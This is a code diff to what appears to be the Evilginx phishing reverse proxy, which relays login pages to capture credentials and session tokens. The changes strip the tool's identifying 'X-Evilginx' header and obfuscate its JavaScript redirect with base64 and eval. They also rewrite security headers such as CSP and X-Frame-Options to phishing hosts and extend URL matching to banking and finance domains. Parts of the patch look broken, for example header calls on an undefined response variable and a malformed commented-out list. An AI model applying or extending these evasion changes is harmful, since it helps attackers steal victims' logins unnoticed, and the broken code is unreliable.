@@ -19,7 +19,6 @@ import (
 	"fmt"
 	"html"
 	"io"
-	"io/ioutil"
 	"net"
 	"net/http"
 	"net/url"
@@ -49,9 +48,9 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-const (
-	HOME_DIR = ".evilginx"
-)
+//const (
+//	HOME_DIR = ".evilginx"
+//)
 
 const (
 	httpReadTimeout  = 45 * time.Second
@@ -59,8 +58,8 @@ const (
 )
 
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
-var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
-var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
 type HttpProxy struct {
 	Server            *http.Server
@@ -120,7 +119,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
-		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml"},
 	}
 
 	p.Server = &http.Server{
@@ -170,7 +169,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
 
 			// handle proxy headers
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
+			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP", "X-Proxy-Id", "CF-Connecting-IP"}
 			for _, h := range proxyHeaders {
 				origin_ip := req.Header.Get(h)
 				if origin_ip != "" {
@@ -466,7 +465,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -496,7 +495,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
+										html, err := os.ReadFile(index_found)
 										if err == nil {
 
 											html = p.injectOgHeaders(l, html)
@@ -552,7 +551,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							path := filepath.Join(t_dir, rel_path)
 							if _, err := os.Stat(path); !os.IsNotExist(err) {
-								fdata, err := ioutil.ReadFile(path)
+								fdata, err := os.ReadFile(path)
 								if err == nil {
 									//log.Debug("ext: %s", filepath.Ext(req_path))
 									mime_type := getContentType(req_path, fdata)
@@ -656,10 +655,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
-					body, err := ioutil.ReadAll(req.Body)
+// req.Header.Set(p.getHomeDir(), o_host)
+					body, err := io.ReadAll(req.Body)
 					if err == nil {
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
@@ -846,7 +845,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
 
@@ -911,7 +910,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
-			var rm_headers = []string{
+
+/*			var rm_headers = []string{
+				"X-Permitted-Cross-Domain-Policies",
+				"X-Evilginx",
+				"Cross-Origin-Opener-Policy",
+				"Cross-Origin-Embedder-Policy",
+				"Cross-Origin-Resource-Policy",
+				"X-Apple-Auth-Attributes",
+				"X-Content-Security-Policy",
+				"X-Cache-Status",
+				"X-Cache",
+				"X-Permitted-Cross-Domain-Policies",
+				"X-Client-Data",
+				"Via",
+				"Forwarded",
+				"Public-Key-Pins",
+				"X-Forwarded-Host",
+				"Public-Key-Pins-Report-Only",
+				"X-Selenium",
+				"X-WebDriver",
+				"X-Puppeteer",
+				"X-PhantomJS",
+				"X-Automation",
+				"X-Bot",
+				"X-Crawler",
+				"X-Spider"
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
 				"Strict-Transport-Security",
@@ -922,6 +946,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
 			}
+
+			adapt response headers */
+			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
+			p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
+			p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
+			p.replaceHeaderWithPhished(resp, "X-Frame-Options")
 
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1002,7 +1032,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			body, err := io.ReadAll(resp.Body)
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1178,7 +1208,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -1218,7 +1248,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
+			if stringExists(mime, []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml"}) {
 				resp.Header.Set("Cache-Control", "no-cache, no-store")
 			}
 
@@ -1313,7 +1343,9 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	js := fmt.Sprintf("top.location.href=%s;", strconv.Quote(rurl))
+	encodedJs := base64.StdEncoding.EncodeToString([]byte(js))
+	body := fmt.Sprintf("<html><head><script>eval(atob('%s'));</script></head><body></body></html>", encodedJs)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
@@ -1350,6 +1382,11 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 			for _, b := range dec[1:] {
 				crc += b
 			}
+                resp.Header.Set("Referrer-Policy", "no-referrer")
+                resp.Header.Set("Cache-Control", "no-store")
+                resp.Header.Set("X-Content-Type-Options", "nosniff")
+                resp.Header.Set("X-Frame-Options", "DENY")
+                resp.Header.Set("Content-Security-Policy", "default-src none; script-src unsafe-eval self")
 			if crc == dec[0] {
 				return true
 			}
@@ -1478,6 +1515,50 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
 
 	return body
+}
+
+func (p *HttpProxy) replaceHeaderWithOriginal(req *http.Request, header string) {
+	if _, ok := req.Header[header]; ok {
+		Hmap := req.Header.Values(header)
+		for i, H := range Hmap {
+			Hmap[i] = p.replaceStringWithOriginal(H)
+		}
+		req.Header[header] = Hmap
+	}
+}
+
+func (p *HttpProxy) replaceHeaderWithPhished(resp *http.Response, header string) {
+	if _, ok := resp.Header[header]; ok {
+		Hmap := resp.Header.Values(header)
+		for i, H := range Hmap {
+			Hmap[i] = p.replaceStringWithPhished(H)
+		}
+		resp.Header[header] = Hmap
+	}
+}
+
+func (p *HttpProxy) replaceStringWithOriginal(str string) string {
+	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
+
+	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
+		if o_host, ok := p.replaceHostWithOriginal(s_host); ok {
+			return o_host
+		}
+		return s_host
+	})
+	return str
+}
+
+func (p *HttpProxy) replaceStringWithPhished(str string) string {
+	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
+
+	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
+		if o_host, ok := p.replaceHostWithPhished(s_host); ok {
+			return o_host
+		}
+		return s_host
+	})
+	return str
 }
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
@@ -1788,9 +1869,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+//func (p *HttpProxy) getHomeDir() string {
+//	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+//}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
@@ -1984,6 +2065,5 @@ func getContentType(path string, data []byte) string {
 func getSessionCookieName(pl_name string, cookie_name string) string {
 	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
 	s_hash := fmt.Sprintf("%x", hash[:4])
-	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
